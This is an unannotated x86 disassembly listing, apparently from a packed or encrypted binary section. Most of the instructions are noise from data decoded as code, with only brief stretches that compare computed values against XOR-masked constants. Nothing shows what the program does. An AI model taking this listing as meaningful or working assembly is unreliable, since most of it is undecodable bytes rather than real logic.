  41a9d6:	xor    bh,BYTE PTR ds:0xb11a03b0
  41a9dc:	cmp    BYTE PTR [esi+esi*4-0x42f47a38],cl
  41a9e3:	pop    ebp
  41a9e4:	or     ebx,DWORD PTR [esp+edx*1]
  41a9e7:	inc    ebp
  41a9e8:	outs   dx,BYTE PTR ds:[esi]
  41a9e9:	add    eax,0xa450e6
  41a9ee:	cmp    eax,0xfac85f41
  41a9f3:	lahf   
  41a9f4:	mov    eax,0xb8103f4d
  41a9f9:	mov    dh,0x5e
  41a9fb:	aam    0xf5
  41a9fd:	sub    al,0x71
  41a9ff:	inc    ebx
  41aa00:	jnp    0x41aa72
  41aa02:	(bad)  
  41aa03:	jo     0x41a9c6
  41aa05:	push   eax
  41aa06:	repz je 0x41a9c1
  41aa09:	je     0x41aa64
  41aa0b:	rcl    DWORD PTR [esi],1
  41aa0d:	cmp    BYTE PTR [eax],bl
  41aa0f:	adc    BYTE PTR [ecx+0x7f],ah
  41aa12:	sbb    bl,dh
  41aa14:	and    dh,dl
  41aa16:	dec    esp
  41aa17:	adc    esi,DWORD PTR [ecx+esi*1+0x5f3f9ee6]
  41aa1e:	ror    esp,1
  41aa20:	int    0x2
  41aa22:	arpl   WORD PTR [edi-0x2fe1d36e],di
  41aa28:	xor    DWORD PTR [eax],esi
  41aa2a:	add    ah,ch
  41aa2c:	retf   0xfaaa
  41aa2f:	outs   dx,BYTE PTR ds:[esi]
  41aa30:	jns    0x41aa41
  41aa32:	pop    ebp
  41aa33:	adc    ebx,esi
  41aa35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa36:	dec    edx
  41aa37:	leave  
  41aa38:	leave  
  41aa39:	lods   eax,DWORD PTR ds:[esi]
  41aa3a:	stos   WORD PTR es:[edi],ax
  41aa3c:	sbb    al,0xec
  41aa3e:	xor    bh,BYTE PTR [ebx]
  41aa40:	add    ah,BYTE PTR [ecx-0x314918e3]
  41aa46:	jg     0x41aab0
  41aa48:	mov    bl,0xcd
  41aa4a:	in     eax,dx
  41aa4b:	sbb    BYTE PTR [edx+ebx*8+0x29],ch
  41aa4f:	adc    al,0xda
  41aa51:	out    dx,eax
  41aa52:	pop    esp
  41aa53:	inc    edi
  41aa54:	jns    0x41aa50
  41aa56:	sbb    BYTE PTR [ebx-0x5e],al
  41aa59:	fcmovnb st,st(0)
  41aa5b:	mov    edi,0xdc22d1
  41aa60:	aas    
  41aa61:	das    
  41aa62:	ret    0x2c00
  41aa65:	mov    fs,WORD PTR [ecx+0x68975253]
  41aa6b:	loopne 0x41aa52
  41aa6d:	cdq    
  41aa6e:	outs   dx,DWORD PTR ds:[esi]
  41aa6f:	enter  0x8bfd,0x34
  41aa73:	or     ebx,esi
  41aa75:	adc    eax,0xc1d2a8c8
  41aa7a:	sub    esp,DWORD PTR [ecx-0x17]
  41aa7d:	aas    
  41aa7e:	pop    esp
  41aa7f:	sbb    BYTE PTR [eax+eax*2],al
  41aa82:	out    dx,eax
  41aa83:	adc    edx,DWORD PTR [edx]
  41aa85:	test   eax,0xc9c81458
  41aa8a:	jg     0x41aafe
  41aa8c:	aam    0x45
  41aa8e:	ror    DWORD PTR [esi],1
  41aa90:	and    esp,DWORD PTR [eax]
  41aa92:	mov    ecx,DWORD PTR [esi+eax*4]
  41aa95:	shl    DWORD PTR gs:[esi+0x42],0x76
  41aa9a:	int    0xcc
  41aa9c:	sub    eax,0x69d4a840
  41aaa1:	xor    bl,BYTE PTR [edi+0x24]
  41aaa4:	pusha  
  41aaa5:	(bad)  [ebp-0x2f]
  41aaa8:	test   al,0x70
  41aaaa:	mov    ds:0xa265a1ff,al
  41aab0:	xchg   ecx,eax
  41aab1:	cmp    bh,BYTE PTR [ebx]
  41aab3:	cmp    esi,esi
  41aab5:	sbb    ch,BYTE PTR [edi-0x18]
  41aab8:	or     al,0xe8
  41aaba:	jecxz  0x41aaf6
  41aabc:	mov    BYTE PTR [ecx],al
  41aabe:	mov    eax,ds:0xe89bbd3d
  41aac3:	(bad)  
  41aac4:	ja     0x41ab3b
  41aac6:	ror    DWORD PTR [edx+0x743e8f27],0x84
  41aacd:	mov    ds:0xbe20b725,al
  41aad2:	sub    esp,esp
  41aad4:	nop
  41aad5:	sub    eax,0xaf267b03
  41aada:	outs   dx,DWORD PTR ds:[esi]
  41aadb:	jns    0x41aafa
  41aadd:	popa   
  41aade:	les    esi,FWORD PTR [esp+edx*2+0x4a7c462f]
  41aae5:	lea    edi,[ebp+eiz*8+0x50286c39]
  41aaec:	je     0x41ab5e
  41aaee:	lods   eax,DWORD PTR ds:[esi]
  41aaef:	data16 (bad) 
  41aaf1:	in     eax,0xd3
  41aaf3:	je     0x41aaf8
  41aaf5:	cmp    esi,0xfcfad418
  41aafb:	sbb    ecx,DWORD PTR [ebx+0x59474aa0]
  41ab01:	pop    ds
  41ab02:	int    0xc4
  41ab04:	jl     0x41ab81
  41ab06:	mov    ebx,DWORD PTR [esp+0x34]
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x4220b1
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x4220b1
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x6a499ed2],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x49d71818],bh
  41ab67:	shl    BYTE PTR [esi],1
  41ab69:	test   BYTE PTR [eax+0x4401a1b4],al
  41ab6f:	mov    esi,0x7e218df7
  41ab74:	mov    BYTE PTR [edi+0x74b9c729],ah
  41ab7a:	call   0xfc79:0xd18cb223
  41ab81:	pop    ebp
  41ab82:	shr    DWORD PTR [edx],cl
  41ab84:	jae    0x41ab4b
  41ab86:	loopne 0x41abe4
  41ab88:	mov    bh,BYTE PTR [ecx+0x57]
  41ab8b:	xchg   ecx,eax
  41ab8c:	out    0xd,al
  41ab8e:	push   edi
  41ab8f:	cmp    BYTE PTR [edi+0x97a1eb8],dl
  41ab95:	and    esi,eax
  41ab97:	cmc    
  41ab98:	loopne 0x41abfb
  41ab9a:	mov    al,ds:0xaff1be50
  41ab9f:	ins    DWORD PTR es:[edi],dx
  41aba0:	arpl   WORD PTR [edx],di
  41aba2:	jns    0x41ab89
  41aba4:	sub    eax,ebx
  41aba6:	dec    ebx
  41aba7:	adc    ah,dh
  41aba9:	cmp    BYTE PTR [ecx+0x67],0x15
  41abad:	lea    eax,[edx-0x45b6b29c]
  41abb3:	stos   DWORD PTR es:[edi],eax
  41abb4:	push   ds
  41abb5:	xchg   ebx,eax
  41abb6:	cmp    eax,0x61009bdb
  41abbb:	leave  
  41abbc:	imul   ebx,DWORD PTR [ebx],0xee5d440e
  41abc2:	stos   DWORD PTR es:[edi],eax
  41abc3:	dec    ebp
  41abc4:	pop    edx
  41abc5:	xor    ecx,DWORD PTR [edi-0xa]
  41abc8:	imul   eax,DWORD PTR [eax],0xc214061a
  41abce:	pop    esp
  41abcf:	push   esp
  41abd0:	dec    esi
  41abd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd2:	mov    ecx,0x5b0e8370
  41abd7:	div    BYTE PTR [ebp-0x3374612e]
  41abdd:	sbb    DWORD PTR [eax+0x14],ecx
  41abe0:	test   DWORD PTR [bx+di+0x50],0xce3693ea
  41abe8:	dec    DWORD PTR [ecx+0x36]
  41abeb:	retf   
  41abec:	jg     0x41abb9
  41abee:	je     0x41abd6
  41abf0:	cmp    ecx,DWORD PTR ds:0xdbe65edd
  41abf6:	ins    DWORD PTR es:[edi],dx
  41abf7:	cmp    eax,0x2c0f25e7
  41abfc:	in     al,0x42
  41abfe:	addr16 in eax,0x51
  41ac01:	mov    ds:0x1577df9b,eax
  41ac06:	mov    ds:0x1ac17037,eax
  41ac0b:	leave  
  41ac0c:	mov    bh,0x5b
  41ac0e:	adc    BYTE PTR [ecx+0x7],bl
  41ac11:	mov    bl,0x17
  41ac13:	add    DWORD PTR [edi-0x121888a9],edx
  41ac19:	in     eax,0x7f
  41ac1b:	and    al,0x4f
  41ac1d:	not    ch
  41ac1f:	pop    eax
  41ac20:	mov    edi,0x8ac2a85
  41ac25:	lods   al,BYTE PTR ds:[esi]
  41ac26:	popa   
  41ac27:	loope  0x41abf5
  41ac29:	jg     0x41ac77
  41ac2b:	test   BYTE PTR [ecx-0x427112a2],ah
  41ac31:	aam    0xe6
  41ac33:	outs   dx,BYTE PTR ds:[esi]
  41ac34:	mov    ecx,0x388c570
  41ac39:	sbb    BYTE PTR [edi-0x61],dh
  41ac3c:	lahf   
  41ac3d:	sbb    bl,BYTE PTR [edi]
  41ac3f:	aad    0xe7
  41ac41:	jmp    eax
  41ac43:	pop    es
  41ac44:	call   0xe4889ce7
  41ac49:	outs   dx,BYTE PTR ds:[esi]
  41ac4a:	push   ebp
  41ac4b:	into   
  41ac4c:	push   esp
  41ac4d:	cmp    eax,0xb32c5e05
  41ac52:	mov    al,0x7e
  41ac54:	(bad)  [ebp-0x60175c1f]
  41ac5a:	xor    BYTE PTR [esi+0x61],dh
  41ac5d:	sub    DWORD PTR ds:0xe5ed4c25,0xffffffb3
  41ac64:	sub    ebx,DWORD PTR [ebx-0x1dad041c]
  41ac6a:	in     al,0x56
  41ac6c:	jmp    DWORD PTR [edi+0x44]
  41ac6f:	push   ecx
  41ac70:	jbe    0x41aca9
  41ac72:	loop   0x41ac28
  41ac74:	mov    bl,0xe5
  41ac76:	mov    ebx,0xa30741b7
  41ac7b:	out    0x66,al
  41ac7d:	cmp    BYTE PTR [ebx+ebp*2],dh
  41ac80:	mov    bl,0xa1
  41ac82:	mov    ebx,0x17eeb4ff
  41ac87:	and    eax,esi
  41ac89:	xlat   BYTE PTR ds:[ebx]
  41ac8a:	push   0x1b
  41ac8c:	cmp    BYTE PTR [ecx],al
  41ac8e:	mov    WORD PTR [edx-0x19],gs
  41ac91:	and    bl,bl
  41ac93:	add    eax,0xff0a0c11
  41ac98:	mov    esp,0xe9fcc7d5
  41ac9d:	xchg   edi,eax
  41ac9e:	popa   
  41ac9f:	shl    BYTE PTR [ecx-0x2266adb9],1
  41aca5:	push   ebp
  41aca6:	pushf  
  41aca7:	in     al,0x98
  41aca9:	dec    ecx
  41acaa:	outs   dx,BYTE PTR ds:[esi]
  41acab:	les    ebp,FWORD PTR [ebx]
  41acad:	inc    esi
  41acae:	and    eax,edi
  41acb0:	xchg   DWORD PTR [ebp-0x460d307a],edx
  41acb6:	addr16 pop edx
  41acb8:	enter  0x9954,0x81
  41acbc:	cmp    edx,DWORD PTR [ecx-0x2c]
  41acbf:	xor    BYTE PTR [esi+0x19d15a45],ah
  41acc5:	cwde   
  41acc6:	outs   dx,BYTE PTR cs:[esi]
  41acc8:	es dec edi
  41acca:	mov    ds:0xaaf051a8,eax
  41accf:	sub    cl,dh
  41acd1:	and    al,0x11
  41acd3:	je     0x41ac5f
  41acd5:	mov    fs:0x164e0f87,eax
  41acdb:	outs   dx,DWORD PTR ds:[esi]
  41acdc:	ins    DWORD PTR es:[edi],dx
  41acdd:	les    edi,FWORD PTR [esi+0x63]
  41ace0:	das    
  41ace1:	adc    DWORD PTR [eax+ebx*4+0x6b4d1599],edx
  41ace8:	repnz inc eax
  41acea:	dec    eax
  41aceb:	cmp    DWORD PTR [esi+ebp*1+0x28360fdf],eax
  41acf2:	cmp    eax,0x98476c2f
  41acf7:	or     DWORD PTR ds:0x9bd47e69,ecx
  41acfd:	call   0xdd8a:0xb2f2dedf
  41ad04:	xchg   esi,eax
  41ad05:	dec    edi
  41ad06:	add    dh,BYTE PTR [edx+eax*2-0x69]
  41ad0a:	int    0x33
  41ad0c:	lahf   
  41ad0d:	test   eax,0x3e80b50f
  41ad12:	mov    dl,0xdf
  41ad14:	ret    0xfbaf
  41ad17:	std    
  41ad18:	xor    al,0x91
  41ad1a:	xor    eax,0x2a21d1bd
  41ad1f:	mov    edx,0xd5d963d9
  41ad24:	jge    0x41ad37
  41ad26:	fmul   st,st(5)
  41ad28:	add    DWORD PTR [edi+0x5e1a8938],ebx
  41ad2e:	sbb    ebp,edx
  41ad30:	adc    DWORD PTR [eax],esp
  41ad32:	lds    ecx,FWORD PTR [eax+0x0]
  41ad35:	push   es
  41ad36:	repnz mov ebp,0x72f6bd21
  41ad3c:	fidiv  DWORD PTR [edx]
  41ad3e:	in     eax,0xe1
  41ad40:	jne    0x41ad43
  41ad42:	add    dh,BYTE PTR [ecx]
  41ad44:	dec    edi
  41ad45:	ror    BYTE PTR [ebx-0x305c6486],1
  41ad4b:	mov    ds:0xbe673d49,eax
  41ad50:	adc    BYTE PTR [ecx-0x7318835e],al
  41ad56:	push   ss
  41ad57:	sub    bh,0x8f
  41ad5a:	sub    al,0x55
  41ad5c:	cmp    DWORD PTR [esi],edx
  41ad5e:	shr    DWORD PTR [eax+0x62735bb5],1
  41ad64:	fsubr  QWORD PTR [edi+0x3c]
  41ad67:	(bad)  
  41ad68:	aam    0xd1
  41ad6a:	push   es
  41ad6b:	sub    al,0xf7
  41ad6d:	or     DWORD PTR [ebp-0x7f],eax
  41ad70:	xor    BYTE PTR [ebp+ebx*8-0x2446f5c1],al
  41ad77:	fcomp  DWORD PTR [esi+0x58]
  41ad7a:	add    DWORD PTR [edx+0x77],edx
  41ad7d:	mov    al,BYTE PTR [edx+0x74]
  41ad80:	and    bl,BYTE PTR [eax+0x6a9aa023]
  41ad86:	sub    ecx,DWORD PTR [edi-0x46]
  41ad89:	xor    ebp,esp
  41ad8b:	(bad)  
  41ad8d:	xchg   ebp,eax
  41ad8e:	add    DWORD PTR [esi+0x36],0xa59ce5ac
  41ad95:	or     al,0x9e
  41ad97:	imul   eax,DWORD PTR [edi+ebp*8+0x75ed46b2],0x4f11a500
  41ada2:	(bad)  
  41ada3:	pop    edi
  41ada4:	dec    ebx
  41ada5:	das    
  41ada6:	fcomp  QWORD PTR [edx+eiz*4-0x3cd9967e]
  41adad:	xor    BYTE PTR [eax-0x28bd626d],al
  41adb3:	fwait
  41adb4:	inc    ecx
  41adb5:	fnstcw WORD PTR [ecx+eiz*4+0x7]
  41adb9:	test   al,0xd3
  41adbb:	push   ebp
  41adbc:	pop    edi
  41adbd:	gs in  eax,dx
  41adbf:	ins    DWORD PTR es:[edi],dx
  41adc0:	test   DWORD PTR [esi+0x77],esp
  41adc3:	ins    BYTE PTR es:[edi],dx
  41adc4:	repz ret 0xbfad
  41adc8:	push   ss
  41adc9:	xor    BYTE PTR [esi-0x429db805],0x8a
  41add0:	sub    bh,bl
  41add2:	in     al,0x62
  41add4:	mov    ecx,DWORD PTR [ebp+0x295f33f]
  41adda:	push   ecx
  41addb:	mov    edx,DWORD PTR [edx+0x4dc89d2e]
  41ade1:	jp     0x41ae59
  41ade3:	cmp    al,bh
  41ade5:	call   0x691a34c3
  41adea:	or     eax,0xd4b602d0
  41adef:	sub    esi,DWORD PTR [ecx+eax*4]
  41adf2:	cmc    
  41adf3:	(bad)  
  41adf4:	loope  0x41ad8a
  41adf6:	mov    edx,0x661abce3
  41adfb:	mov    bl,BYTE PTR [ecx+0x68]
  41adfe:	imul   ebx,DWORD PTR [edi],0x8e55f4ac
  41ae04:	inc    ebp
  41ae05:	call   0x5db4f9a0
  41ae0a:	dec    esi
  41ae0b:	push   ebx
  41ae0c:	sub    bh,BYTE PTR [esi-0x106a9c4b]
  41ae12:	aad    0x92
  41ae14:	dec    ebx
  41ae15:	or     dh,ah
  41ae17:	nop
  41ae18:	push   ss
  41ae19:	sub    BYTE PTR [edx-0xb],cl
  41ae1c:	xor    ecx,DWORD PTR [ebx+ebp*4]
  41ae1f:	lds    ebp,FWORD PTR [edi+eax*8-0x46]
  41ae23:	push   dx
  41ae25:	pop    ebp
  41ae26:	sub    BYTE PTR [ebx-0x6eef0951],dl
  41ae2c:	outs   dx,BYTE PTR ds:[esi]
  41ae2d:	sbb    al,0xa6
  41ae2f:	cmp    ecx,0xe128dfa3
  41ae35:	arpl   WORD PTR [esi+0x667928ac],ax
  41ae3b:	scas   eax,DWORD PTR es:[edi]
  41ae3c:	cmp    eax,0x2d2e11b0
  41ae41:	loopne 0x41ae84
  41ae43:	test   esp,0xf98b2667
  41ae49:	in     al,0xa9
  41ae4b:	test   eax,0x7effcaf9
  41ae51:	inc    ebp
  41ae52:	lods   eax,DWORD PTR ds:[esi]
  41ae53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae55:	shl    BYTE PTR [eax+0x4c68f73d],0xc7
  41ae5c:	pop    ebp
  41ae5d:	int3   
  41ae5e:	aad    0x4
  41ae60:	mov    eax,ds:0xac498b35
  41ae65:	rcl    dl,0xa2
  41ae68:	cmc    
  41ae69:	cld    
  41ae6a:	test   eax,0x341d03b2
  41ae6f:	mov    bh,0x7f
  41ae71:	fcmovb st,st(4)
  41ae73:	jno    0x41ae98
  41ae75:	dec    eax
  41ae76:	fxch   st(0)
  41ae78:	js     0x41ae49
  41ae7a:	and    al,bl
  41ae7c:	dec    eax
  41ae7d:	sbb    DWORD PTR [eax+0x1ccdbd18],0x31
  41ae84:	xchg   esi,eax
  41ae85:	shr    cl,cl
  41ae87:	ret    0x6141
  41ae8a:	jnp    0x41aec4
  41ae8c:	jg     0x41aebb
  41ae8e:	ds pop esp
  41ae90:	dec    eax
  41ae91:	pop    es
  41ae92:	call   0x7268b6a
  41ae97:	out    dx,al
  41ae98:	mov    dh,0x5
  41ae9a:	fsubr  DWORD PTR [eax]
  41ae9c:	fadd   st(4),st
  41ae9e:	sbb    esp,eax
  41aea0:	pusha  
  41aea1:	xchg   DWORD PTR [esi+esi*2-0x5a],ecx
  41aea5:	push   esp
  41aea6:	das    
  41aea7:	sbb    DWORD PTR [ebx],ebp
  41aea9:	out    0xf7,eax
  41aeab:	or     BYTE PTR [ebp+0x70],ch
  41aeae:	mov    ebp,DWORD PTR [ebp-0x15bfe964]
  41aeb4:	inc    ecx
  41aeb5:	mov    cl,0xba
  41aeb7:	fs jecxz 0x41af28
  41aeba:	jo     0x41ae6f
  41aebc:	push   es
  41aebd:	sbb    bh,BYTE PTR [ebx+0x701db0d]
  41aec3:	push   edx
  41aec4:	mov    es,WORD PTR ds:[ecx+esi*2]
  41aec8:	sbb    bl,bl
  41aeca:	(bad)  
  41aecb:	mov    ebp,0x39695efe
  41aed0:	add    BYTE PTR ds:0x629da674,dh
  41aed6:	cld    
  41aed7:	pop    edi
  41aed8:	cli    
  41aed9:	pop    edi
  41aeda:	add    BYTE PTR [ebx+0x27],dh
  41aedd:	mov    dl,0xc8
  41aedf:	mov    ss,ecx
  41aee1:	adc    eax,0x1d41a6c8
  41aee6:	sbb    dh,BYTE PTR [ebx]
  41aee8:	inc    edi
  41aee9:	mov    ebp,0xbd716a59
  41aeee:	ret    
  41aeef:	repnz or BYTE PTR [ecx-0x41],bl
  41aef3:	adc    ebp,DWORD PTR [edi+esi*8+0x1d]
  41aef7:	mov    bl,0x59
  41aef9:	cld    
  41aefa:	mov    ebp,0x266a9161
  41aeff:	jb     0x41af4c
  41af01:	xchg   BYTE PTR [eax+eax*1-0x28],bh
  41af05:	mov    cl,0x91
  41af07:	in     al,dx
  41af08:	(bad)  
  41af09:	mov    ds:0x39677370,eax
  41af0e:	aad    0x9d
  41af10:	push   cs
  41af11:	cmp    DWORD PTR [eax+0x4226f792],ebx
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af2e
  41af80:	iret   
  41af81:	sub    DWORD PTR [edx+0x18169717],ebp
  41af87:	mov    esp,0x29181812
  41af8c:	or     BYTE PTR [edi+eiz*1-0x1f],cl
  41af90:	cmp    DWORD PTR [edx+0x6032835d],edx
  41af96:	(bad)  
  41af98:	mov    edi,0xef10a3ef
  41af9d:	shr    edi,0x36
  41afa0:	repz fwait
  41afa2:	add    DWORD PTR [edi-0x2464ef68],0xf5cf08f0
  41afac:	push   ecx
  41afad:	mov    DWORD PTR [ecx+ebx*1],eax
  41afb0:	push   0x79
  41afb2:	pop    ss
  41afb3:	dec    esp
  41afb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb5:	push   DWORD PTR [esi+0x64a7ac46]
  41afbb:	(bad)  
  41afbc:	mov    bh,0x26
  41afbe:	scas   eax,DWORD PTR es:[edi]
  41afbf:	xor    eax,0xfdf9a11a
  41afc4:	mov    ch,0xaa
  41afc6:	jb     0x41af4f
  41afc8:	pop    esp
  41afc9:	mov    edx,0xc1a47771
  41afce:	scas   al,BYTE PTR es:[edi]
  41afcf:	adc    al,0x79
  41afd1:	iret   
  41afd2:	mov    edx,0xf2bb6b0e
  41afd7:	and    ah,BYTE PTR [ecx]
  41afd9:	fwait
  41afda:	enter  0xa5db,0xac
  41afde:	pop    eax
  41afdf:	unpcklps xmm4,XMMWORD PTR [ecx]
  41afe2:	xchg   ecx,eax
  41afe3:	(bad)  
  41afe4:	pop    ebx
  41afe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afe6:	test   BYTE PTR [edx-0x65afbc25],ch
  41afec:	jl     0x41b02b
  41afee:	pop    esp
  41afef:	mov    ebp,0x864bf31
  41aff4:	dec    eax
  41aff5:	(bad)  
  41aff6:	pop    eax
  41aff7:	fcomp  st(1)
  41aff9:	cmp    ebp,DWORD PTR [ecx+0x6a]
  41affc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41affd:	ss mov edx,0x65515066
  41b003:	out    dx,eax
  41b004:	adc    al,dl
  41b006:	rcl    DWORD PTR [edx+0x1a00bf73],1
  41b00c:	arpl   dx,si
  41b00e:	cmp    al,0x5b
  41b010:	jae    0x41afdb
  41b012:	xlat   BYTE PTR ds:[ebx]
  41b013:	adc    BYTE PTR [eax+eax*2],0xa7
  41b017:	push   esp
  41b018:	inc    edi
  41b019:	add    DWORD PTR gs:[ebp-0x1],eax
  41b01d:	in     al,dx
  41b01e:	mov    dh,0xa9
  41b020:	dec    edx
  41b021:	call   0x57efefa3
  41b026:	push   esi
  41b027:	mov    esp,cs
  41b029:	mov    ecx,0x480caa51
  41b02e:	out    dx,eax
  41b02f:	into   
  41b030:	mov    ds:0x2760fba7,al
  41b035:	imul   ecx,DWORD PTR [ecx-0xc],0xb2846615
  41b03c:	stc    
  41b03d:	cmp    DWORD PTR [ebx],esi
  41b03f:	mov    esi,0x5ebbf6c3
  41b044:	ins    WORD PTR es:[edi],dx
  41b046:	(bad)  
  41b047:	push   0x22
  41b049:	mov    ah,0xe7
  41b04b:	sti    
  41b04c:	ins    BYTE PTR es:[edi],dx
  41b04d:	xor    BYTE PTR [esi+0x36],cl
  41b050:	in     al,0x7c
  41b052:	cmc    
  41b053:	and    ch,ah
  41b055:	dec    DWORD PTR [edi+ebp*8]
  41b058:	push   0x7
  41b05a:	into   
  41b05b:	stos   DWORD PTR es:[edi],eax
  41b05c:	mov    ds:0x4b9cc3cc,al
  41b061:	sub    al,0x39
  41b063:	sub    eax,DWORD PTR [edx+0x6732f34d]
  41b069:	xchg   edx,eax
  41b06a:	(bad)  
  41b06b:	out    dx,eax
  41b06c:	mov    BYTE PTR [edi],bl
  41b06e:	cmp    eax,0xf6c1b82d
  41b073:	imul   BYTE PTR [esi-0x56]
  41b076:	pop    edx
  41b077:	cmp    al,0xaf
  41b079:	jecxz  0x41b085
  41b07b:	xor    BYTE PTR [eax-0x7e],al
  41b07e:	and    edx,ebx
  41b080:	(bad)  
  41b081:	call   0x5149:0xa5c2af92
  41b088:	(bad)  
  41b089:	rcr    DWORD PTR [esi+0x29],cl
  41b08c:	add    esi,DWORD PTR [esi+0x26]
  41b08f:	repnz mov BYTE PTR [esi+eax*4+0x29de03f5],ah
  41b097:	mov    edi,0x7835ccfa
  41b09c:	jmp    0x1233:0x4a37d9ce
  41b0a3:	jnp    0x41b026
  41b0a5:	jo     0x41b0d0
  41b0a7:	inc    ecx
  41b0a8:	or     al,0xd8
  41b0aa:	mov    ds:0x43927bcf,al
  41b0af:	je     0x41b05e
  41b0b1:	leave  
  41b0b2:	dec    ecx
  41b0b3:	push   ds
  41b0b4:	jo     0x41b0e3
  41b0b6:	pop    edi
  41b0b7:	stos   DWORD PTR es:[edi],eax
  41b0b8:	pop    ss
  41b0b9:	popa   
  41b0ba:	loop   0x41b0dc
  41b0bc:	call   FWORD PTR [eax-0x56120aeb]
  41b0c2:	fdivr  DWORD PTR ds:[ebx]
  41b0c5:	jp     0x41b0f5
  41b0c7:	add    dl,BYTE PTR [ecx+0x67]
  41b0ca:	call   0x7045:0x5fe534cb
  41b0d1:	bound  ebp,QWORD PTR [ecx]
  41b0d3:	daa    
  41b0d4:	lods   eax,DWORD PTR ds:[esi]
  41b0d5:	mov    fs,WORD PTR [ebp-0x40bae387]
  41b0db:	inc    eax
  41b0dc:	dec    esi
  41b0dd:	loop   0x41b0fe
  41b0df:	xchg   esp,eax
  41b0e0:	les    edi,FWORD PTR [esi+0x72]
  41b0e3:	add    al,0xa5
  41b0e5:	mov    edx,0xb9f77e50
  41b0ea:	cs jae 0x41b158
  41b0ed:	lahf   
  41b0ee:	add    DWORD PTR [esi],0x3e
  41b0f1:	mov    esp,DWORD PTR [edx-0x50]
  41b0f4:	(bad)  
  41b0f5:	aad    0xb
  41b0f7:	sar    DWORD PTR [eax+ebp*1-0x2590386f],1
  41b0fe:	jg     0x41b0f3
  41b100:	jbe    0x41b0ec
  41b102:	fnsetpm(287 only) 
  41b104:	cs iret 
  41b106:	leave  
  41b107:	or     DWORD PTR [ebp+0x2e],esi
  41b10a:	imul   ebx,DWORD PTR [esi+0x11ea1f4b],0xaf71f705
  41b114:	js     0x41b190
  41b116:	mov    ch,0x26
  41b118:	retf   
  41b119:	test   al,0x3b
  41b11b:	dec    ecx
  41b11c:	ins    BYTE PTR es:[edi],dx
  41b11d:	push   ss
  41b11e:	jp     0x41b143
  41b120:	pop    ss
  41b121:	pusha  
  41b122:	clc    
  41b123:	sbb    edi,DWORD PTR [eax-0x24]
  41b126:	ret    0xa3ee
  41b129:	sub    eax,0x3f03282a
  41b12e:	imul   eax,DWORD PTR [ecx+0x23],0x57a15520
  41b135:	js     0x41b101
  41b137:	int    0x3e
  41b139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b13a:	clc    
  41b13b:	add    eax,0xad1ca9b3
  41b140:	out    0x8f,al
  41b142:	xor    al,0x9c
  41b144:	mov    esi,0x42f7dc42
  41b149:	into   
  41b14a:	outs   dx,DWORD PTR ds:[esi]
  41b14b:	fnstenv [eax-0x418d4789]
  41b151:	xchg   ebx,eax
  41b152:	xor    eax,0x9afb0dfa
  41b157:	and    eax,0x9c688743
  41b15c:	into   
  41b15d:	jecxz  0x41b11b
  41b15f:	cmp    eax,0xc684cc0e
  41b164:	into   
  41b165:	nop
  41b166:	cmp    ebx,DWORD PTR [edi]
  41b168:	imul   edx,DWORD PTR [edx-0x6bb6fc95],0xffffff93
  41b16f:	idiv   DWORD PTR [ebp-0x2bc31122]
  41b175:	xchg   ebp,eax
  41b176:	mov    BYTE PTR [esi+0xd],bh
  41b179:	mov    eax,ds:0xd8b198c6
  41b17e:	sbb    eax,0x4efda5df
  41b183:	xchg   ebx,eax
  41b184:	adc    BYTE PTR [ebp-0x37f427fd],0xa7
  41b18b:	bound  ebx,QWORD PTR gs:[edx]
  41b18e:	jp     0x41b191
  41b190:	neg    BYTE PTR [edi+ecx*8+0x2a175c85]
  41b197:	fcomp  DWORD PTR [esi-0x7f627259]
  41b19d:	add    dl,BYTE PTR [ebp-0x3c]
  41b1a0:	shr    BYTE PTR [esi-0x33],1
